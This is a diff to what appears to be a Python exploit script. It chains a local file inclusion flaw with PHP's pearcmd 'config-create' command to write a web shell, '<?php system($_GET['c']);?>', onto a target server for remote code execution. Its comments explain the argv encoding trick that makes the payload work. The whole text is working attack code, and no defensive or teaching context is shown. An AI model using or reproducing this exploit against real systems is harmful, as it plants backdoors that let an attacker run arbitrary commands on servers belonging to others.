@@ -697,14 +697,19 @@ def attempt_rce(session: requests.Session, base: str, lfi: LFIResult,
     depth = lfi.depth
     ppath = lfi.pearcmd_used
 
-    stub_content = "<?php system($_GET['c']); ?>"
-    stub_encoded = urllib.parse.quote(stub_content)
     stub_path = write_path
+
+    # pearcmd config-create embeds argv[2] as <default_channel> in an XML config file.
+    # PHP then include()s that file — any <?php ?> block in it executes.
+    # argv is derived from QUERY_STRING split on spaces (+), so we use + for spaces
+    # and pass the PHP literal without additional URL encoding — the HTTP layer
+    # already did one decode before pearcmd sees argv, so characters like < > ? $ are safe.
+    stub_literal = "<?php+system($_GET['c']);?>"  # + = space in argv split
 
     # Stage 1: write stub via pearcmd config-create
     payload = build_payload(theme.suffix, depth, ppath)
     url_stage1 = build_url(base, page.page_id, page.slug, payload, port)
-    url_stage1 += f"+config-create+{stub_encoded}+{stub_path}"
+    url_stage1 += f"+config-create+{stub_literal}+{stub_path}"
 
     if verbose:
         print(f"  [*] RCE Stage 1: config-create -> {stub_path}")
